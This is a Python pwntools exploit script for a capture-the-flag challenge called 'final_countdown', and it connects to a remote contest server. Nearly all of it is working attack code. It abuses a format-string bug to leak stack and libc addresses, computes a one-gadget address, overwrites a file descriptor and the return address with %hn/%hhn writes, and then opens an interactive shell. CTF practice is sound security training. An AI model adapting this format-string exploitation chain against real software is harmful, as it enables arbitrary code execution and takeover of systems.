from pwn import *

# libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
# r = process('./final_countdown')
# gdb.attach(r, "b*0x0000555555554A39")
r = remote('final-countdown.grandprix.whitehatvn.com', 10202)
def fmt(payload):
    r.recvuntil('tick tock .. What do you want to say:')
    r.send(payload)

fmt("%9$p-%11$p-%13$p-%11$s\n")
res = r.recvline()[:-1]
leak = res.split("-")
__libc_start_main_ret= int(leak[0],16)
stack = int(leak[1],16)
main = int(leak[2],16)
value_stack = u64(leak[3].ljust(8,"\x00"))
rbp_main = stack-0xe8
log.info('stack: %#x' % stack)
log.info('__libc_start_main_ret: %#x' % __libc_start_main_ret)
log.info('main: %#x' % main)
log.info('rbp main: %#x' % rbp_main)
log.info('value_stack: %#x' % value_stack)
baselibc = __libc_start_main_ret - 0x20830
log.info("base of libc: %#x" %baselibc)
gadget = baselibc + 0x45216
log.info("gadget: %#x" %gadget)

#write address of fb in to stack
value = (rbp_main-4)&0xffff # <= convert argv to address of fd
payload = "%"+str(value)+"x"+"%11$hn"
log.info(payload)
fmt(payload)

#overwrite value of fd is 1000
payload = "%1000x%37$hn" #overwrite fd
fmt(payload)

#write return address in to stack
value = (rbp_main+8)&0xff # <= convert argv to address of fd
payload = "%"+str(value)+"x"+"%11$hhn"
log.info(payload)
fmt(payload)

#write return address to gadget
payload = "%"+str(gadget&0xffff)+"x"+"%37$hn"
fmt(payload)

#write return address in to stack
value = (rbp_main+10)&0xff # <= convert argv to address of fd
payload = "%"+str(value)+"x"+"%11$hhn"
log.info(payload)
fmt(payload)

#write return address to gadget
payload = "%"+str((gadget >> 16)&0xff)+"x"+"%37$hhn"
fmt(payload)


#write fd address in to stack
value = (rbp_main-1)&0xff # <= convert argv to address of fd
payload = "%"+str(value)+"x"+"%11$hhn"
log.info(payload)
fmt(payload)

#overwrite value of fb is 0xff....
payload = "%"+str(0xff)+"x"+"%37$hhn"
fmt(payload)
#
r.interactive()